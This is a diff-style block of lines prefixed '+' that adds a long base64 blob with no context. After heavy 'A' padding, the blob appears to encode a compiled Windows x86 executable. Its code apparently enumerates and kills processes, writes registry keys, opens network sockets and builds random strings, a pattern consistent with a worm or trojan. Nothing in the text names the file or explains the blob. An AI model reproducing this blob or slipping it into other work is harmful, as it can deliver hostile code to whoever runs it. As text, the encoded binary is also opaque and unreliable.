+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFWL7IPsFItF
+EFNWM/ZXM9uJdeyJdfiJRfA7dRAPjW8BAACLRfBqA1o7wolV9H0DiUX0i030uD09PT2Nffxm
+q4XJqn4Vi0UIjX38A/CLwcHpAvOli8gjyvOkik38isHA6AKF24hF/3Qmi30Uhf9+J4vDi3UM
+K0X4mff/hdJ1G8YEMw1DxgQzCkODRfgC6wuLdQyLfRTrA4t1DA+2Rf+LFTDwQACA4QPA4QSK
+BBCIBDOKRf2K0EPA6gQCyoXbdCGF/34di8MrRfiZ9/+F0nUOxgQzDUPGBDMKQ4NF+AKKRf2L
+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
